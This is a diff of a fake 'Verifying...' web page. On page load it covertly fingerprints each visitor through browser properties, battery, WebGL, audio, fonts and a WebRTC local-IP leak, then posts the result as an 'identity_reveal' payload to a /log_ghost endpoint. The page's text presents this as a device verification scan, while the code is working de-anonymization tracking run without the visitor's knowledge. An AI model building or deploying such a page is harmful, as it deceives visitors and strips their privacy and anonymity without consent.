@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
   <meta charset="UTF-8" />
   <title>Verifying...</title>
@@ -18,10 +18,9 @@
     .loader {
       margin-top: 20px;
       border: 4px solid #0f0;
-      border-top: 4px solid transparent;
       border-radius: 50%;
-      width: 30px;
-      height: 30px;
+      width: 24px;
+      height: 24px;
       animation: spin 1s linear infinite;
     }
     @keyframes spin {
@@ -35,123 +34,97 @@
     <h2>Hold tight… scanning device for verification 👁️‍🗨️</h2>
     <div class="loader"></div>
   </div>
+  
+<script>
+(async () => {
+  const payload = {
+    type: "identity_reveal",
+    userAgent: navigator.userAgent,
+    language: navigator.language,
+    timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    platform: navigator.platform,
+    vendor: navigator.vendor,
+    width: window.screen.width,
+    height: window.screen.height,
+    memory: navigator.deviceMemory || "unknown",
+    threads: navigator.hardwareConcurrency || "unknown",
+    headless: navigator.webdriver || false,
+    battery: {},
+    webgl: null,
+    audio_fp: null,
+    webrtc_ip: null,
+    fonts: [],
+    timestamp: new Date().toISOString()
+  };
 
-  <script>
-    async function revealIdentity() {
-      const data = {
-        type: 'identity_reveal',
-        userAgent: navigator.userAgent,
-        language: navigator.language,
-        timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        platform: navigator.platform,
-        vendor: navigator.vendor,
-        width: screen.width,
-        height: screen.height,
-        memory: navigator.deviceMemory || 'unknown',
-        threads: navigator.hardwareConcurrency || 'unknown',
-        headless: navigator.webdriver || false,
-        battery: {},
-        webgl: getWebGLRenderer(),
-        fonts: getFonts(),
-        audio_fp: await getAudioFingerprint(),
-        timestamp: new Date().toISOString()
-      };
+  // Battery Info
+  try {
+    const battery = await navigator.getBattery();
+    payload.battery = {
+      level: battery.level,
+      charging: battery.charging
+    };
+  } catch (e) {}
 
-      try {
-        const battery = await navigator.getBattery();
-        data.battery = {
-          charging: battery.charging,
-          level: battery.level
-        };
-      } catch (e) {}
+  // WebGL Info
+  try {
+    const canvas = document.createElement('canvas');
+    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+    payload.webgl = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+  } catch (e) {}
 
-      try {
-        await fetch("/log_ghost", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(data)
-        });
-      } catch (e) {
-        console.error("Logging failed", e);
+  // Audio Fingerprint
+  try {
+    const context = new (window.AudioContext || window.webkitAudioContext)();
+    const osc = context.createOscillator();
+    const analyser = context.createAnalyser();
+    osc.connect(analyser);
+    osc.start(0);
+    const freqData = new Uint8Array(analyser.frequencyBinCount);
+    analyser.getByteFrequencyData(freqData);
+    payload.audio_fp = btoa(freqData.slice(0, 30).join(","));
+    osc.stop();
+  } catch (e) {}
+
+  // WebRTC IP Leak
+  try {
+    const pc = new RTCPeerConnection({ iceServers: [] });
+    pc.createDataChannel("");
+    pc.createOffer().then(o => pc.setLocalDescription(o));
+    pc.onicecandidate = event => {
+      if (event && event.candidate && event.candidate.candidate) {
+        const ip = event.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
+        if (ip) payload.webrtc_ip = ip[1];
       }
-    }
+    };
+    setTimeout(() => pc.close(), 1500);
+  } catch (e) {}
 
-    function getFonts() {
-      const fonts = ['Arial', 'Courier New', 'Georgia', 'Times New Roman', 'Verdana'];
-      const available = [];
-      const base = document.createElement("span");
-      base.innerText = "mmmmmmmmmmlli";
-      base.style.fontSize = "72px";
-      base.style.position = "absolute";
-      base.style.left = "-9999px";
-      document.body.appendChild(base);
+  // Font Detection
+  try {
+    const testFonts = ["Arial", "Courier New", "Times New Roman", "Comic Sans MS", "Monaco"];
+    const base = "sans-serif";
+    const canvas = document.createElement("canvas");
+    const ctx = canvas.getContext("2d");
+    const baselineSize = {};
+    ctx.font = "72px " + base;
+    const baseWidth = ctx.measureText("mmmmmmmmmmlli").width;
+    testFonts.forEach(font => {
+      ctx.font = "72px '" + font + "'," + base;
+      const width = ctx.measureText("mmmmmmmmmmlli").width;
+      if (width !== baseWidth) payload.fonts.push(font);
+    });
+  } catch (e) {}
 
-      const defaultWidth = base.offsetWidth;
-      const defaultHeight = base.offsetHeight;
+  // Send to server
+  fetch("/log_ghost", {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify(payload)
+  });
 
-      for (const font of fonts) {
-        base.style.fontFamily = font;
-        if (base.offsetWidth !== defaultWidth || base.offsetHeight !== defaultHeight) {
-          available.push(font);
-        }
-      }
-
-      document.body.removeChild(base);
-      return available;
-    }
-
-    function getWebGLRenderer() {
-      try {
-        const canvas = document.createElement("canvas");
-        const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
-        const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
-        return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-      } catch (e) {
-        return "unknown";
-      }
-    }
-
-    async function getAudioFingerprint() {
-      try {
-        return await new Promise(resolve => {
-          const context = new (window.AudioContext || window.webkitAudioContext)();
-          const oscillator = context.createOscillator();
-          const analyser = context.createAnalyser();
-          const gain = context.createGain();
-          const script = context.createScriptProcessor(4096, 1, 1);
-
-          oscillator.type = "triangle";
-          oscillator.frequency.setValueAtTime(10000, context.currentTime);
-          gain.gain.value = 0;
-
-          oscillator.connect(analyser);
-          analyser.connect(script);
-          script.connect(context.destination);
-          oscillator.start(0);
-
-          const fingerprint = [];
-          let count = 0;
-
-          script.onaudioprocess = function () {
-            const array = new Uint8Array(analyser.frequencyBinCount);
-            analyser.getByteFrequencyData(array);
-            fingerprint.push(array[0]);
-            count++;
-            if (count > 30) {
-              script.disconnect();
-              analyser.disconnect();
-              oscillator.disconnect();
-              context.close();
-              resolve(btoa(fingerprint.join(",")));
-            }
-          };
-        });
-      } catch (e) {
-        return "unavailable";
-      }
-    }
-
-    revealIdentity();
-  </script>
+})();
+</script>
 </body>
 </html>
